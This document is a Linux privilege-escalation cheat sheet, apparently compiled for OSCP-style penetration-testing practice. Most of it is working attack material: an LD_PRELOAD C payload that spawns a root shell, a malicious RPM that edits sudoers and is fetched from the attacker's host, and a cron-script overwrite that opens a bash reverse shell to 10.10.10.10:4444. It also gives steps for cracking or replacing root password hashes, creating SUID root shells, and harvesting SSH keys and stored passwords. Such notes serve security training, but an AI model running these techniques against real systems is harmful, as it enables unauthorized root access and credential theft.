# Linux Privilege Escalation 

## Sudo
List the programs which sudo allows your user to run:

`sudo -l`

Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io)) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

Automatically check of bins are vulnerable
https://github.com/tjnull/OSCP-Stuff/tree/master/Priv-esc/Linux


### sudo 

`sudo usr/bin/sudo su`

### Environment Variables - LD_PRELOAD and LD_LIBRARY_PATH

It should show on the second line of output to `sudo -l`

Open a text file and paste the content

```
#include <stdio.h> 
#include <sys/types.h> 
#include <stdlib.h> 

void _init() 
{
unsetenv("LD_PRELOAD"); 
setgid(0); 
setuid(0);
system("/bin/bash"); 
}
```

Save the file as x.c

Compile `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`

Run `sudo LD_PRELOAD=/tmp/x.so apache2`


### base32
```
LFILE=/root/.ssh/id_rsa 
base32 "$LFILE" | base32 --decode > ssh_key 
```

```
chmod 400 ssh_key 
ssh root@$ip -i ssh_key
```

### yum

on Attcker (kali)

```
echo 'echo "jjameson ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh 
apt-get install ruby ruby-dev rubygems build-essential 
gem install fpm 
fpm -n root -s dir -t rpm -a all --before-install sudo.sh .

```

on Target

```
wget http://$kaliIP/root-1.0-1.noarch.rpm
sudo yum localinstall -y root-1.0-1.noarch.rpm
```

## Weak File Permissions
```
ls -l /etc/shadow
ls -l /etc/passwd

cat /etc/passwd | grep bash #List all usres that has bash access
cat /etc/group #See which user has higher privilege

```
### Readable /etc/shadow
The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-readable:

`ls -l /etc/shadow`

View the contents of the /etc/shadow file:

`cat /etc/shadow`

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

Switch to the root user, using the cracked password:

`su root`

### Writable /etc/shadow
The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-writable:

`ls -l /etc/shadow`

Generate a new password hash with a password of your choice:

`mkpasswd -m sha-512 newpasswordhere`  

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

`su root`
### Writable /etc/passwd
The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Note that the /etc/passwd file is world-writable:

`ls -l /etc/passwd`

Generate a new password hash with a password of your choice:

`openssl passwd newpasswordhere`

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:

`su root`

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").  

Now switch to the newroot user, using the new password:

`su newroot`

## Cron Jobs
For Cron jobs you can overwrite two things.
1. Files
2. PATH environment Variable

`cat /etc/crontab`

Example of a script and a path with bad permissions

```
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

### Cron Jobs - File Permissions

Find the script scheduled to run as a cronjob

`locate overwrite.sh`

or 

`find / -name overwrite.sh 2> /dev/null`

Verify that is is writable

`ls -l /usr/local/bin/overwrite.sh`

replace content with

```
#!/bin/bash  
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

```

start a listener and wait for connection

### Cron Jobs - PATH Environment Variable

If you can execute one command as root, do the following

`chmod +xs /bin/bash`
`/bin/bash -p`

If you find a cronjob running in root privilege, echo the commmand in bash script.

Alternatively, (more safe), add the following to the bash script

```
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```

then run

`/tmp/rootbash -p`



### Cron Jobs - Wild Cards

Check if `tar` 
`cat /usr/local/bin/compress.sh | grep tar | grep '*'`


## SUID SGID
### Known Exploits

Find all the SUID/SGID executables

`find / -type f -perm -04000 -ls 2>/dev/null`

go back to GTFOBins and check what executable you can exploit to gain a shell

Check what executable is vulnerable


https://medium.com/go-cyber/linux-privilege-escalation-with-suid-files-6119d73bc620

### Shared Object Injection

### Environment Variables
### Abusing Shell Features 

If condition 1 and 2 are met, 

**Condition 1**

SUID executables have an absolute path `/usr/sbin/service` check the output of both commands and find the common file path


	grep --color=auto -rnw '/' -ie "/usr/sbin/service" --color=always 2> /dev/null

	find / -type f -perm -04000 -ls 2>/dev/null

Example `/usr/local/bin/suid-env2`

**Condition 2**

Bash versions <4.2-048

`/bin/bash --version`

If yes, run

```
function /usr/sbin/service { /bin/bash -p; }  
export -f /usr/sbin/service
```

then run the SUID executable

example `/usr/local/bin/suid-env2`


### Abusing Shell Features 
## Password and Keys
### All files

**Look for a keyword in all files**

Look for "PASSWORD" ignore caps - Long output

`grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null`

`find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`

**Look for a file with a file name**

`find / -name **.ovpn 2> /dev/null | more`
`find / -name *password* 2> /dev/null | more`
`find / -name *cred* 2> /dev/null | more`

### History Files

Look for password in history

`cat ~/.*history | less`

### Config Files

### SSH Keys

`find / -name .ssh 2> /dev/null`

`find / -name id_rsa 2> /dev/null`

`find / -name authorized_keys 2> /dev/null`

Save the content to a new file on the attacker machine

`chmod 400 <file>`

`ssh -i <file> root@<ip>`

## NFS
## Kernel Exploits

Check kernel version using one of the commands

`uname -a`

`cat /proc/version`

`hostnamectl | grep kernel`

### 2.6<2.619 
ip_append_data() local ring0 root exploit
https://www.exploit-db.com/exploits/9542
See Writeup OSCP Phoenix

### 2.6.22<3.9
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)
https://www.exploit-db.com/exploits/40616

### 3.0.3 
'Mempodipper' Local Privilege Escalation
https://www.exploit-db.com/exploits/18411
Check OSCP Beta

### Dirty Cow

https://github.com/FireFart/dirtycow/blob/master/dirty.c


## Privilege Escalation Scripts
